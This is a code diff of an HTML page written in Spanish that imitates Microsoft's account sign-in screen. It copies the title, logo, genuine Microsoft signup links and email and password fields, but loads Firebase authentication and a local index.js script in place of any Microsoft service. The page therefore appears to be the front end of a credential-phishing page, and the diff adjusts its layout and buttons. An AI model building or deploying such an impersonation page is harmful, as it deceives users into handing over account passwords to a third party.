@@ -1,24 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script src="https://www.gstatic.com/firebasejs/9.8.4/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.8.4/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.8.4/firebase-auth-compat.js"></script>
+    <!-- Importa las bibliotecas de Firebase versión 9 -->
+    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-auth-compat.js"></script>
+
+    <script src="js/index.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" type="image/x-icon" href="./src/ic_logo.ico" />
-    <LINK href="css/style.css" rel="stylesheet" type="text/css">
+    <LINK href="./css/style.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <title>Iniciar sesión en tu cuenta Microsoft</title>
 </head>
 <body>
     <div class="container">
         <div class="square">
             <div class="logo">
-                <img src="src/logo.svg" alt="">
+                <img src="./src/logo.svg" alt="">
             </div>
             <div class="title">
                 Iniciar sesión
             </div>
+
+            <button id="backButton" class="back-button" style="display: none"><i class="fa-solid fa-arrow-left"></i>  Regresar</button>
 
             <div class="form">
                 <form id="loginForm">
@@ -30,23 +35,24 @@
                         name="email"
                         id="email"
                     >
-                    <div class="password-form">
-                        <input 
-                            class="password_input" 
-                            type="password" 
-                            placeholder="Contraseña"
-                            name="password"
-                            id="password"
-                        >
-                    </div>
-                    <p class="notAccount">¿No tiene una cuenta? <a class="crearUna" href="https://signup.live.com/signup?id=74335&contextid=DCDED287EAD370F7&opid=83384CE502458640&bk=1698213378&sru=https://login.live.com/login.srf%3fid%3d74335%26id%3d74335%26contextid%3dDCDED287EAD370F7%26opid%3d83384CE502458640%26mkt%3dES-MX%26lc%3d2058%26bk%3d1698213378%26uaid%3d9f900aaff28f421d995f4c0d477deed9&uiflavor=web&lic=1&mkt=ES-MX&lc=2058&uaid=9f900aaff28f421d995f4c0d477deed9">Cree una.</a></p>
-                    <p><a class="subText" style="font-size: 12px; margin-right: 6px;" href="">Iniciar sesión con una clave de seguridad</a><img src="src/ic_interrogacion.svg" alt=""></p>
-                    <button id="nextButton" class="next-button">Siguiente</button>
+                    <input 
+                        class="password_input" 
+                        type="password" 
+                        placeholder="Contraseña"
+                        name="password"
+                        id="password"
+                    >
                 </form>
-            </div>
+                <p class="notAccount">¿No tiene una cuenta? <a class="crearUna" href="https://signup.live.com/signup?id=74335&contextid=DCDED287EAD370F7&opid=83384CE502458640&bk=1698213378&sru=https://login.live.com/login.srf%3fid%3d74335%26id%3d74335%26contextid%3dDCDED287EAD370F7%26opid%3d83384CE502458640%26mkt%3dES-MX%26lc%3d2058%26bk%3d1698213378%26uaid%3d9f900aaff28f421d995f4c0d477deed9&uiflavor=web&lic=1&mkt=ES-MX&lc=2058&uaid=9f900aaff28f421d995f4c0d477deed9">Cree una.</a></p>
+                <p><a class="subText" style="font-size: 12px; margin-right: 6px;" href="">Iniciar sesión con una clave de seguridad</a><img src="src/ic_interrogacion.svg" alt=""></p>
+                
+                <button id="nextButton" class="next-button">Siguiente</button>
+
+                <button id="loginButton" class="next-button" style="display: none">Iniciar Sesión</button>
+
+            </div>            
         </div>
         <button class="options"><img src="src/ic_key.svg" alt="">Opciones de inicio de sesión</button>
     </div>
-    <script src="js/index.js"></script>
 </body>
 </html>
